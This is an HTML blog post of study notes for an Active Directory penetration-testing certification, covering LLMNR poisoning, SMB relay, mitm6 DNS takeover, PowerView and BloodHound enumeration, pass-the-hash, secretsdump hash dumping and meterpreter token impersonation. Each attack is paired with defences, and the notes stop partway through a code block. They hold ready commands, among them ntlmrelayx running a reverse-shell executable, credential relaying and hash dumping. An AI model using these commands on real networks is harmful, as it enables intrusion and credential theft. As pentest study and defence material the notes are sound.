<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Attacking Active Directory" /><meta property="og:locale" content="en" /><meta name="description" content="Attacking Active Directory: Initial Attack Vectors" /><meta property="og:description" content="Attacking Active Directory: Initial Attack Vectors" /><link rel="canonical" href="https://akashjx.github.io/posts/01-NotesActiveDirectory/" /><meta property="og:url" content="https://akashjx.github.io/posts/01-NotesActiveDirectory/" /><meta property="og:site_name" content="Akash Hansda" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-08T00:00:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Attacking Active Directory" /><meta name="twitter:site" content="@aakashJx" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Attacking Active Directory: Initial Attack Vectors","headline":"Attacking Active Directory","url":"https://akashjx.github.io/posts/01-NotesActiveDirectory/","@type":"BlogPosting","dateModified":"2022-01-08T00:00:00+05:30","datePublished":"2022-01-08T00:00:00+05:30","mainEntityOfPage":{"@type":"WebPage","@id":"https://akashjx.github.io/posts/01-NotesActiveDirectory/"},"@context":"https://schema.org"}</script><title>Attacking Active Directory | Akash Hansda</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Akash Hansda"><meta name="application-name" content="Akash Hansda"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://media-exp1.licdn.com/dms/image/C5603AQFPEG49NyTGEg/profile-displayphoto-shrink_800_800/0/1590910330538?e=1645056000&v=beta&t=RuSj9cT7MpANKDthZ_AZolkMEXlSjh9jKjnwToSjXps" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Akash Hansda</a></div><div class="site-subtitle font-italic">Hacker / Friend / Cyber Security Enthusiast</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/akashJx" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/aakashJx" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['aakash.hansda','gmail.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Attacking Active Directory</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Attacking Active Directory</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Akash Hansda </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Jan 8, 2022, 12:00 AM +0530" >Jan 8<i class="unloaded">2022-01-08T00:00:00+05:30</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2943 words">16 min read</span></div></div><div class="post-content"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 560px 387px'%3E%3C/svg%3E" data-proofer-ignore data-src="/assets/Images-Notes-01/PEH.png" class="preview-img" alt="ActiveDirectory" width="560px" height="387px"><h1 id="attacking-active-directory-initial-attack-vectors">Attacking Active Directory: Initial Attack Vectors</h1><p>I am writing this for final preparation of OCSP. This article (notes) is gathered from PEH course by TCM academy and some blogs from internet.</p><p>Links are at bottom of page.</p><p>Do use <code class="language-plaintext highlighter-rouge">Contents</code> button on right side to easily navigate through topics.</p><hr /><h2 id="netbios-and-llmnr-name-poisoning">Netbios and LLMNR Name Poisoning</h2><h3 id="explanation">Explanation</h3><ul><li>LLMNR : Link Local Multicast Name Resolution. Basically DNS. It is used to identify hosts when DNS fails to do so.<li>Previously NBT-NS.<li>Key flaw is that the services utilize a user’s username and NTLMv2 hash when appropriately responded to.</ul><p><img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-06-21-50-11.png" alt="" /></p><h3 id="attack">Attack</h3><p><strong>Attack Condition</strong> : MITM and internal network.</p><p><strong>Attack Method</strong></p><ol><li>Run <code class="language-plaintext highlighter-rouge">responder</code><li>Trigger / Wait for an event.<li>Capture Hashes.</ol><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>responder.py <span class="nt">-I</span> tun0 <span class="nt">-rdw</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-06-21-54-59.png" alt="" /> <img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-06-21-55-17.png" alt="" /> <img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-06-21-55-46.png" alt="" /></p><p>Then crack these hashes with <code class="language-plaintext highlighter-rouge">hashcat</code>.</p><h3 id="defence">Defence</h3><blockquote><p>The best defense in this case is to disable LLMNR and NBT-NS</p><ul><li>To disable LLMNR, select “Turn OFF Multicast Name Resolution” under Local Computer Policy &gt; Computer Configuration &gt; Administrative Templates &gt; Network &gt; DNS Client in the Group Policy Editor.<li>To disable NBT-NS, navigate to Network Connections &gt; Network Adapter Properties &gt; TCP/IPv4 Properties &gt; Advanced tab &gt; WINS tab and select “Disable NetBIOS over TCP/IP”. If a company must use or cannot disable LLMNR/NBT-NS, the best course of action is to :<li>Require Network Access Control (with MAC Filters)<li>Require strong user passwords.</ul></blockquote><hr /><h2 id="smb-relay-attacks">SMB Relay Attacks</h2><p>Instead of cracking hashes gathered with Responder, we can instead relay those hashes to specific machines and potentially gain access.</p><p><strong>Attack Condition</strong> :</p><ul><li>SMB Signing must be in <em>not required/disabled</em> state on target. (from <code class="language-plaintext highlighter-rouge">nmap</code> we can get this) <code class="language-plaintext highlighter-rouge">No packet/sign validation.</code><li>Relayed user credentials must be admin on machine.</ul><p><strong>Tools</strong> : <code class="language-plaintext highlighter-rouge">Responder</code> and</p><ul><li>disable <code class="language-plaintext highlighter-rouge">SMB</code> and <code class="language-plaintext highlighter-rouge">HTTP</code> from <code class="language-plaintext highlighter-rouge">responder.conf</code> file. So we can still listen but not respond through responder tool.</ul><p><strong>Attack Method</strong></p><ol><li>Run <code class="language-plaintext highlighter-rouge">responder</code> and then<li>Run <code class="language-plaintext highlighter-rouge">ntlmrelayx</code><li>Trigger / Wait for an event.<li>SAM hashes are captured and relayed.</ol><blockquote><p>Windows SAM file = Linux Shadow File.</p></blockquote><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>responder.py <span class="nt">-I</span> tun0 <span class="nt">-rdw</span>
ntlmrelayx.py <span class="nt">-tf</span> targets.txt <span class="nt">-smb2support</span>
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-06-22-24-31.png" alt="" /> <img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-06-22-25-24.png" alt="" /> <img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-06-21-55-17.png" alt="" /> <img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-06-22-29-31.png" alt="" /></p><p>Immediately the hashes are relayed to a bunch of machines which was mentioned in <em>targets.txt</em> with <code class="language-plaintext highlighter-rouge">ntlmrelayx</code> command.</p><p><strong>Attack Shell</strong> <img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-07-00-08-30.png" alt="" /> <em>ntlmrelayx.py interactive</em></p><p><img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-07-00-10-45.png" alt="" /> <em>smb shell</em></p><p>Other ways to abuse this feature are below.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>ntlmrelayx.py <span class="nt">-tf</span> targets.txt <span class="nt">-smb2support</span> <span class="nt">-i</span>
ntlmrelayx.py <span class="nt">-tf</span> targets.txt <span class="nt">-smb2support</span> <span class="nt">-e</span> evil.exe <span class="c"># execute rev shell</span>
ntlmrelayx.py <span class="nt">-tf</span> targets.txt <span class="nt">-smb2support</span> <span class="nt">-c</span> <span class="nb">whoami</span> <span class="c"># execute command</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">msfconsole</code>’s psexec module / <code class="language-plaintext highlighter-rouge">psexec.py</code> will give complete cmd shell.</p><p>Sometimes it will require multiple attempts. Shares should be writeable.</p><p>Also try <code class="language-plaintext highlighter-rouge">smbexec.py</code> and <code class="language-plaintext highlighter-rouge">wmiexec.py</code>.</p><h3 id="defence-1">Defence</h3><blockquote><ul><li>Enable SMB Signing on all devices<ul><li>Pro : Completely stops the attack<li>Con : Can cause performance issues with file copies.</ul><li>Disable NTLM authentication on network.<ul><li>Pro : Completely stops the attack<li>Con : If Kerberos stops working, Windows defaults back to NTLM.</ul><li>Account tiering<ul><li>Pro : Limits domain admins to specific tasks.<li>Con : Enforcing the policy may be difficult.</ul><li>Local admin restriction<ul><li>Pro : Can prevent a lot of lateral movement.<li>Con : Potential increase in the amount of service desk tickets.</ul></ul></blockquote><hr /><h2 id="mitm-6--ipv6-attack--dns-takeover-attack">MITM 6 / IPv6 Attack / DNS Takeover Attack</h2><p><a href="https://cheatsheet.haax.fr/windows-systems/exploitation/ipv6/">MITM6 CheatSheet Read</a></p><h3 id="explanation-1">Explanation</h3><p><code class="language-plaintext highlighter-rouge">mitm6</code> is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server.</p><blockquote><p>It does this by replying to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server.</p><p>The DNS server, mitm6 will selectively reply to DNS queries of the attackers choosing and redirect the victims traffic to the attacker machine instead of the legitimate server.</p></blockquote><h3 id="attack-1">Attack</h3><p><strong>Attack Condition</strong> :</p><ul><li>IPv4 is mostly used in systems. IPv6 may be turned on and may not being used.<li>Nothing/Nobody is doing DNS for IPv6.</ul><p><strong>Now, this will be leveraged.</strong> Attacker machine will <code class="language-plaintext highlighter-rouge">spoof as DNS</code>. All IPv6 traffic will be sent through this, causing victims to connect to ntlmrelayx for HTTP and SMB connections.</p><p>We can get authentication to DC via LDAP or SMB.</p><blockquote><p>try chaining <code class="language-plaintext highlighter-rouge">smbrelay</code> + <code class="language-plaintext highlighter-rouge">mitm6</code> or it’s default counterpart <code class="language-plaintext highlighter-rouge">ntlmreayx</code>.</p></blockquote><p><strong>Tools</strong> : <a href="https://github.com/dirkjanm/mitm6">mitm6</a> - in python2 venv. pip3 breaks the installation.</p><p><strong>Attack Method</strong></p><ol><li>Run <code class="language-plaintext highlighter-rouge">mitm6</code> and then<li>Run <code class="language-plaintext highlighter-rouge">ntlmrelayx</code><li>Reboot a machine in network.<li>Now a lot of info will be dumped into a file by ntlmrelayx.<li>When any administrator login into any machine in network the credentials will be relayed. A new user account will be created with admin privileges.</ol><p>Now it can be used to access DC.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>mitm6 <span class="nt">-d</span> marvel.local

ntlmrelayx <span class="nt">-6</span> <span class="nt">-t</span> ldaps://192.168.57.140 <span class="nt">-wh</span> fakewpad.marvel.local <span class="nt">-l</span> lootme
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-07-12-36-47.png" alt="" /> <img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-07-12-44-04.png" alt="" /></p><p><code class="language-plaintext highlighter-rouge">mitm6</code> will start sending replies to all the DNS queries. After rebooting any one machine in network mitm6 will:</p><ul><li>start enumerating the relayed credentials.<li>Checking the privileges.<li>Domain info will be dumped into a file. (-l lootme)</ul><p><img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-07-12-50-38.png" alt="" /> <img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-07-12-51-27.png" alt="" /></p><p>When an Administrator put password at login screen then</p><ul><li>attack will target ldap.<li>set up an access control list.<li>Create a new user.<li>It can also add a computer in network. Check resource.</ul><p><img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-07-12-54-00.png" alt="" /> <img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-07-13-00-13.png" alt="" /></p><h3 id="defence-2">Defence</h3><ul><li>IPv6 poisoning abuses the fact that Windows queries for an IPv6 address even in IPv4-only environment. If you don’t use IPv6 internally, the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy. Disabling IPv6 entirely may have unwanted side effects. Setting the following predefined rules to Block instead of allow prevents the attack from working<ul><li>(Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPv6-In)<li>(Inbound) Core Networking - Router Advertisement (ICMPv6-In)<li>Outbound Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPv6-Out)<blockquote><ul><li>If WPAD is not in use internally, disable it via Group Policy and by Disabling the WinHttpAutoProxySvc service.<li>Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding.<li>Consider Administrative users to the Protected Users Group or marking them as Account is sensitive and cannot be delegated which will prevent any impersonation of that user via delegation.</ul></blockquote></ul></ul><hr /><h2 id="passback-attack">Passback Attack</h2><p>SMB + <code class="language-plaintext highlighter-rouge">Printer</code> + <strong><code class="language-plaintext highlighter-rouge">Default Credentials</code></strong> + LDAP + ncat + Responder This case is rare.</p><p>Read below blog for this.</p><p><a href="https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/">A Pen Tester’s Guide to Printer Hacking</a></p><p>Printer has potential to get DC. Don’t underestimate this.</p><hr /><h2 id="other-vectors--strategies">Other Vectors &amp; Strategies</h2><ul><li>Begin day with mitm6 or responder.<li>run scans to generate traffic.<li>if scans are taking too long, look for websites in scope (<code class="language-plaintext highlighter-rouge">http_version</code>).<li>Look for default credentials on web logins<ul><li>Printers<li>Jenkins<li>etc.</ul><li>Think outside the box. Like chain attack vectors.<li>Enumerate and abuse features.</ul><hr /><h1 id="attacking-active-directory-post-compromise-enumeration">Attacking Active Directory: Post-Compromise Enumeration</h1><p><em>These tools will be used after compromising any machine in network with aim to get DC.</em></p><h2 id="powerview">PowerView</h2><p><strong><code class="language-plaintext highlighter-rouge">PowerView</code></strong> : PS tool to enumerate Domain Controller, Policy, Users, Groups etc.</p><p><a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">PowerView</a> and do check <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a></p><p><strong>Enumeration Methods</strong></p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span text-data=" Powershell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="c"># Load PowerView</span><span class="w">
</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-ep</span><span class="w"> </span><span class="nx">bypass</span><span class="w">
</span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\PowerView.ps1</span><span class="w">

</span><span class="c"># Get Domain info</span><span class="w">
</span><span class="n">Get-NetDomain</span><span class="w">

</span><span class="c"># Get All DC Info | Most useful.</span><span class="w">
</span><span class="n">Get-NetDomainController</span><span class="w">

</span><span class="c"># Get Domain Policy</span><span class="w">
</span><span class="n">Get-DomainPolicy</span><span class="w">
</span><span class="p">(</span><span class="n">Get-DomainPolicy</span><span class="p">)</span><span class="o">.</span><span class="s2">"system access"</span><span class="w">

</span><span class="n">Get-NetUser</span><span class="w"> </span><span class="c"># All user's detailed info</span><span class="w">
</span><span class="n">Invoke-ShareFinder</span><span class="w"> </span><span class="c"># Find Interesting Shares</span><span class="w">
</span></pre></table></code></div></div><p><a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">PowerView Cheat Sheet</a></p><hr /><h2 id="bloodhound">Bloodhound</h2><p><strong><code class="language-plaintext highlighter-rouge">Bloodhound</code></strong> : tool to visualize in a graph form what is going on domain in the network and where we can find the sensitive user and shortest path to get to domain admin.</p><blockquote><p>Sharphound : bloodhound Created in C#</p></blockquote><p>Get <a href="https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1">SharpHound.ps1</a> to <code class="language-plaintext highlighter-rouge">Invoke-BloodHound</code> function.</p><p>And transfer it to compromised machine.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span text-data=" Powershell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="c"># Load SharpHound</span><span class="w">
</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-ep</span><span class="w"> </span><span class="nx">bypass</span><span class="w">
</span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\SharpHound.ps1</span><span class="w">

</span><span class="c"># running the ingestor</span><span class="w">
</span><span class="n">Invoke-BloodHound</span><span class="w"> </span><span class="nt">-CollectionMethod</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">MARVEL.local</span><span class="w"> </span><span class="nt">-ZipFileName</span><span class="w"> </span><span class="nx">file.zip</span><span class="w">
</span></pre></table></code></div></div><p>It will collect all data to <code class="language-plaintext highlighter-rouge">file.zip</code>. Transfer it back to attacker machine for analysis in bloodhound.</p><p>In attacker machine start <code class="language-plaintext highlighter-rouge">neo4j</code> and then <code class="language-plaintext highlighter-rouge">bloodhound</code>. And upload data. No need to unzip files.</p><hr /><h1 id="attacking-active-directory-post-compromise-attacks">Attacking Active Directory: Post-Compromise Attacks</h1><p><em>This requires some sort of credentials first cracked or hashed.</em></p><h2 id="pass-the-hash--password">Pass the Hash / Password</h2><p>If we crack a password and/or can dump the SAM hashes, we can leverage both for lateral movement in networks.</p><p><em>updated <code class="language-plaintext highlighter-rouge">crackmapexec</code> has slightly different syntax. It may not match with below given screenshots as this was recorded before update of cme.</em></p><h3 id="attack-methods">Attack Methods</h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>crackmapexec smb 10.10.10.99 <span class="nt">-u</span> sUser <span class="nt">-d</span> DOMAIN <span class="nt">-p</span> Password1
crackmapexec smb 10.10.10.99 <span class="nt">-u</span> sUser <span class="nt">-H</span> sOmEntlmHash <span class="nt">--local-auth</span>
<span class="c"># trying to dump SAM file</span>
crackmapexec smb 10.10.10.99 <span class="nt">-u</span> sUser <span class="nt">-d</span> DOMAIN <span class="nt">-p</span> Password1
</pre></table></code></div></div><p>For Example : <em>Credentials here will be passed to entire subnet.</em> <img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-08-00-49-58.png" alt="" /> <em>crackmapexec | passthepassword attack</em></p><p><img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-08-00-47-43.png" alt="" /> <em>crackmapexec | passthehash attack</em></p><p><em>we can also use impacket tools like <code class="language-plaintext highlighter-rouge">psexec.py</code> for password / hash attacks.</em></p><hr /><h3 id="dumping-hashes-with-secretsdumppy">Dumping Hashes with secretsdump.py</h3><p>If we have atleast 1 set of credentials we can try to grab password hashes saved in cache.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>secretsdump.py marvel/fcastle:Password1@10.10.10.99
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-08-01-02-32.png" alt="" /> <img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-08-01-01-35.png" alt="" /></p><h3 id="defence-3">Defence</h3><p>Hard to completely prevent, but we can make it more difficult on an attacker:</p><blockquote><ul><li>Limit account re-use:<ul><li>avoid re-using local admin password.<li>Disable Guest and Administrator accounts.<li>Limit who is a local administrator (least privilege)</ul><li>Utilizing strong passwords<ul><li>The longer the better (&gt;14 characters)<li>avoid using common words.<li>I like long sentences</ul><li>Privilege Access Management<ul><li>Check out/in sensitive accounts when needed.<li>Automatically rotate passwords on check out and check in.<li>Limits pass attacks as hash/password is strong and constantly rotated.</ul></ul></blockquote><hr /><h2 id="token-impersonation">Token Impersonation</h2><h3 id="explanation-2">Explanation</h3><p>Tokens : Temporary keys that allow you access to a system/network without having to provide credentials each time you access af file. Think cookies for computers.</p><blockquote><p>Types :</p><ul><li>Delegate - Created for loggin into a machine or using Remote Desktop<li>Impersonate - “non interactive” such as attacking a network drive or a domain logon script.</ul></blockquote><h3 id="attack-2">Attack</h3><p><strong>Attack Condition</strong> : MITM and internal network. <strong>Tools</strong> : <strong><code class="language-plaintext highlighter-rouge">Responder</code></strong> from <code class="language-plaintext highlighter-rouge">Impacket</code>.</p><p><strong>Attack Method</strong></p><ol><li>Pop a shell and load Incognito.<li>Impersonate our domain user.</ol><p><strong>Note</strong> : We will be only able to impersonate any user only if they are logged in once.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>meterpreter&gt; load  incognito
meterpreter&gt; list_tokens <span class="nt">-u</span>
  ...a list of users...
meterpreter&gt; impersonated user MARVEL<span class="se">\f</span>castle
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-08-13-27-13.png" alt="" /> <img data-proofer-ignore data-src="/assets/Images-Notes-01/2022-01-08-13-28-04.png" alt="" /></p><p>Attempt to dump hashes as non-Domain Admin</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span text-data=" Powershell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
